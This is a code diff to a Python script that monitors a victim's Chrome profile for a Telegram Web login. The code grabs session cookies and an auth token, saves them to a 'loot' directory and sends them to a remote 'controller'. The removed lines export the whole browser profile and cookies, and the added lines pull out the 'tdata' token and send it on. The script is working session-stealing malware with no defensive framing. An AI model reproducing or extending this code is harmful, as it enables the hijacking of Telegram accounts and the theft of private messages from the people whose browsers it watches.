@@ -82,19 +82,18 @@ def get_telegram_local_storage():
     return storage
 
 
-def check_telegram_session(cookies):
-    """Check if Telegram session cookies exist"""
-    telegram_cookies = []
-    
+def get_telegram_token(cookies):
+    """Extract Telegram auth token from cookies"""
     for cookie in cookies:
         domain = cookie.get("domain", "").lower()
         name = cookie.get("name", "").lower()
+        value = cookie.get("value", "")
         
-        # Telegram Web uses these domains
-        if "telegram.org" in domain or "web.telegram.org" in domain:
-            telegram_cookies.append(cookie)
+        # Telegram Web auth token
+        if "web.telegram.org" in domain and name == "tdata":
+            return value
     
-    return telegram_cookies
+    return None
 
 
 def export_session():
@@ -172,58 +171,32 @@ def main():
             check_count += 1
             
             cookies = get_chrome_cookies()
-            tg_cookies = check_telegram_session(cookies)
+            token = get_telegram_token(cookies)
             
             # Check Local Storage for Telegram auth
             ls_path = CHROME_PROFILE / "Local Storage" / "leveldb"
             has_local_storage = False
             if ls_path.exists():
                 ls_size = sum(f.stat().st_size for f in ls_path.rglob('*') if f.is_file())
-                if ls_size > 5000:  # Has some data
+                if ls_size > 5000:
                     has_local_storage = True
-            
-            # Telegram Web stores session in IndexedDB
-            idb_path = CHROME_PROFILE / "IndexedDB"
-            has_telegram_idb = False
-            
-            if idb_path.exists():
-                for item in idb_path.iterdir():
-                    if "telegram" in item.name.lower():
-                        size = sum(f.stat().st_size for f in item.rglob('*') if f.is_file())
-                        print(f"[TG Monitor] Found Telegram IDB: {item.name}, size: {size}", flush=True)
-                        if size > 1000:
-                            has_telegram_idb = True
-                            break
             
             # Log status every 10 checks
             if check_count % 10 == 0:
-                print(f"[TG Monitor] Check #{check_count}: cookies={len(cookies)}, tg_cookies={len(tg_cookies)}, idb={has_telegram_idb}, ls={has_local_storage}", flush=True)
+                print(f"[TG Monitor] Check #{check_count}: has_token={token is not None}, ls={has_local_storage}", flush=True)
             
-            # Detect session: Telegram cookies OR IndexedDB with data OR significant LocalStorage
-            session_detected = (len(tg_cookies) > 0 or has_telegram_idb) and has_local_storage
+            # Detect session: have token AND local storage
+            session_detected = token is not None and has_local_storage
             
             if session_detected and not session_captured:
-                print(f"[TG Monitor] *** SESSION DETECTED! ***", flush=True)
-                print(f"[TG Monitor] Cookies: {len(tg_cookies)}, IndexedDB: {has_telegram_idb}", flush=True)
+                print(f"[TG Monitor] *** TOKEN CAPTURED! ***", flush=True)
+                print(f"[TG Monitor] Token: {token[:50]}...", flush=True)
                 
                 session_captured = True
                 
-                # Save cookies
-                cookies_file = LOOT_DIR / SESSION_ID / "cookies.json"
-                with open(cookies_file, "w") as f:
-                    json.dump(cookies, f, indent=2)
-                print(f"[TG Monitor] Saved cookies to {cookies_file}", flush=True)
-                
-                # Export full session
-                profile_path = export_session()
-                print(f"[TG Monitor] Exported profile to {profile_path}", flush=True)
-                
-                # Send alert to controller
-                result = send_to_controller("telegram_session", {
-                    "cookies": tg_cookies,
-                    "cookie_count": len(tg_cookies),
-                    "has_indexeddb": has_telegram_idb,
-                    "profile_path": profile_path
+                # Send token to controller
+                result = send_to_controller("telegram_token", {
+                    "token": token
                 })
                 print(f"[TG Monitor] Sent to controller: {result}", flush=True)
         
